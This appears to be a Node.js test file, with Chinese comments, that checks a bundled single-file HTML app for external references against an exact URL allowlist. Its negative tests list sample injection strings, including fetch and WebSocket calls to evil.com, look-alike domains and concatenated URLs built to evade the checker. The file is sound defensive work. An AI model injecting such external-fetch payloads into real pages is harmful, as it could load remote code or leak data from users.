import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');

// 成品里允许出现的网址（R20 / R31）：逐字相等才放行，不是前缀匹配。
//  - 三个假期数据来源模板（只有按「检查更新」或自动检查条件成立时才会请求）
//  - 校验用的 gov.cn 前缀（只做字符串比较，从不请求）
//  - 自定义网址的输入框占位示例（example.com 是 RFC 2606 保留的示例域名，从不请求）
export const URL_ALLOWLIST = Object.freeze([
  'https://raw.githubusercontent.com/NateScarlet/holiday-cn/master/{year}.json',
  'https://cdn.jsdelivr.net/gh/NateScarlet/holiday-cn@master/{year}.json',
  'https://fastly.jsdelivr.net/gh/NateScarlet/holiday-cn@master/{year}.json',
  'https://www.gov.cn/',
  'https://example.com/{year}.json',
]);
// 不带主机名的 "https://" 只允许出现在这两个固定上下文里（R31），且成品里各恰好一次（见下方 dist 测试）。
// 其他任何裸 "https://"（例如 "https://" + host 的拼接）都会被当成 URL 报出来。
export const BARE_SCHEME_CONTEXTS = Object.freeze([
  'var SCHEME = "https://";', // holiday-data.js：校验自定义网址的前缀
  '必须以 https:// 开头', // strings：自定义网址的错误提示
]);
const BARE_SCHEME = /https?:\/\/(?![A-Za-z0-9])/gi;

export function findExternalRefs(html) {
  const problems = [];
  if (/<script[^>]*\ssrc\s*=/i.test(html)) problems.push('external <script src>');
  if (/<link\b/i.test(html)) problems.push('<link>');
  if (/<img[^>]*\ssrc\s*=/i.test(html)) problems.push('<img src>');
  if (/<iframe\b/i.test(html)) problems.push('<iframe>');
  if (/<embed\b/i.test(html)) problems.push('<embed>');
  if (/<object\b/i.test(html)) problems.push('<object>');
  if (/<source[^>]*\ssrc(set)?\s*=/i.test(html)) problems.push('<source src>');
  // CSS 只在 <style> 与 style="" 里找（JS 里的 new URL( 不是 CSS）
  const css = [...html.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/gi), ...html.matchAll(/\sstyle\s*=\s*"([^"]*)"/gi)].map((m) => m[1]).join('\n');
  if (/\burl\(\s*(?!["']?data:)/i.test(css)) problems.push('CSS url(');
  if (/@import\b/i.test(css)) problems.push('CSS @import');
  // 拼出来的网址：协议字面量后面接 +，或模板字符串里协议后面直接是 ${
  if (/["'`]\s*(https?|wss?):\/\/\s*["'`]\s*\+/i.test(html)) problems.push('concatenated scheme');
  if (/(https?|wss?):\/\/\$\{/i.test(html)) problems.push('template-literal scheme');
  if (/\bimport\s*\(/.test(html)) problems.push('dynamic import(');
  if (/\bwss?:\/\//i.test(html)) problems.push('ws:// / wss://');
  // 协议相对网址（//host…）出现在字符串或属性值的开头
  if (/(["'`]|=\s*)\/\/[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)+/.test(html)) problems.push('protocol-relative //host');
  let rest = html;
  for (const ctx of BARE_SCHEME_CONTEXTS) rest = rest.split(ctx).join(' ');
  const urls = rest.match(/https?:\/\/[^\s"'`<>)]*/gi) ?? [];
  for (const u of urls) {
    if (u.startsWith('http://www.w3.org/')) continue; // SVG xmlns
    if (URL_ALLOWLIST.includes(u)) continue;
    problems.push(`URL: ${u}`);
  }
  return problems;
}

test('dist is one self-contained file', () => {
  execFileSync('node', ['build.mjs'], { cwd: root, stdio: 'pipe' });
  const html = readFileSync(join(root, 'dist/work-motivator.html'), 'utf8');
  assert.deepEqual(findExternalRefs(html), []);
  assert.match(html, /<script>[\s\S]+<\/script>/);
  assert.match(html, /<style>[\s\S]+<\/style>/);
});

test('checker flags injected external refs (negative check)', () => {
  assert.ok(findExternalRefs('<script src="a.js"></script>').length);
  assert.ok(findExternalRefs('<link rel="stylesheet" href="a.css">').length);
  assert.ok(findExternalRefs('<script>fetch("https://x.com")</script>').length);
  assert.ok(findExternalRefs('<script>fetch("http://x.com")</script>').length);
  assert.deepEqual(findExternalRefs('<svg xmlns="http://www.w3.org/2000/svg"></svg>'), []);
});

test('allowlist is exact: allowed endpoints pass, anything else (incl. look-alikes) fails (negative proof)', () => {
  for (const u of URL_ALLOWLIST) assert.deepEqual(findExternalRefs(`<script>const a = '${u}';</script>`), [], u);
  const bad = [
    '<img src="https://x.com/a.png">',
    '<img alt="" src="data:image/png;base64,AA">', // 任何 <img src> 都不允许
    '<link rel="icon" href="https://x.com/f.ico">',
    '<link rel="preconnect" href="https://cdn.jsdelivr.net">',
    '<style>body{background:url(https://x.com/a.png)}</style>',
    '<style>body{background:url("/a.png")}</style>',
    '<style>@import "https://x.com/a.css";</style>',
    '<iframe src="about:blank"></iframe>',
    '<embed src="x.swf">',
    '<object data="x"></object>',
    '<video><source src="https://x.com/a.mp4"></video>',
    '<picture><source srcset="a.png"></picture>',
    // R31：评审复现的三种拼接（之前因为裸 "https://" 在白名单里而漏掉）
    '<script>fetch("https://"+"evil.com/a.js")</script>',
    "<script>fetch('https://' + host + '/x')</script>",
    '<script>import("https://"+h)</script>',
    '<script>fetch(`https://${host}/x`)</script>',
    '<script>import("./a.js")</script>',
    '<script>fetch("//evil.com/a.js")</script>',
    '<a href="//evil.com/x">x</a>',
    "<script>new WebSocket('wss://evil.com/s')</script>",
    "<script>new WebSocket('ws://evil.com/s')</script>",
    '<script>const s = "https://";</script>',
    '<script>var SCHEME = "https:// ";</script>',
    '<div style="background:url(https://x.com/a.png)"></div>',
    '<script src="https://cdn.jsdelivr.net/gh/NateScarlet/holiday-cn@master/2027.json"></script>',
    "<script>fetch('https://raw.githubusercontent.com/NateScarlet/holiday-cn/master/evil.js')</script>",
    "<script>fetch('https://raw.githubusercontent.com/evil/holiday-cn/master/{year}.json')</script>",
    "<script>fetch('https://cdn.jsdelivr.net/gh/NateScarlet/holiday-cn@master/{year}.json.evil')</script>",
    "<script>fetch('https://www.gov.cn/x.js')</script>",
    "<script>fetch('https://www.gov.cn.evil.com/')</script>",
    "<script>fetch('https://example.com/{year}.json/x')</script>",
    "<script>fetch('https://example.com/')</script>",
    "<script>fetch('https://ghproxy.com/https://raw.githubusercontent.com/NateScarlet/holiday-cn/master/{year}.json')</script>",
    '<script>fetch(`https://evil.com/${y}`)</script>',
    "<script>fetch('http://evil.com/www.w3.org/')</script>",
  ];
  for (const b of bad) assert.ok(findExternalRefs(b).length > 0, `must be flagged: ${b}`);
  // CSS 的 data: url 仍允许（目前没用到，但不是外部引用）
  assert.deepEqual(findExternalRefs('<style>a{background:url(data:image/png;base64,AA)}</style>'), []);
});

test('bare "https://" is allowed only in its two fixed contexts (R31)', () => {
  for (const ctx of BARE_SCHEME_CONTEXTS) assert.deepEqual(findExternalRefs(`<script>${ctx}</script>`), [], ctx);
  assert.ok(findExternalRefs('<script>var SCHEME = "https://"; fetch("https://" + x)</script>').length > 0, 'a second bare scheme next to the allowed one is still flagged');
});

test('dist: bare "https://" occurs exactly in the two fixed contexts, once each (any new occurrence fails)', () => {
  const html = readFileSync(join(root, 'dist/work-motivator.html'), 'utf8');
  assert.equal((html.match(BARE_SCHEME) ?? []).length, BARE_SCHEME_CONTEXTS.length);
  for (const ctx of BARE_SCHEME_CONTEXTS) assert.equal(html.split(ctx).length - 1, 1, ctx);
});

test('dist: the bundled source URLs are exactly the three defaults (no extra endpoint slipped in)', () => {
  const html = readFileSync(join(root, 'dist/work-motivator.html'), 'utf8');
  const urls = new Set(html.match(/https?:\/\/[^\s"'`<>)]*/gi) ?? []);
  for (const u of URL_ALLOWLIST.slice(0, 3)) assert.ok(urls.has(u), `bundled: ${u}`);
});
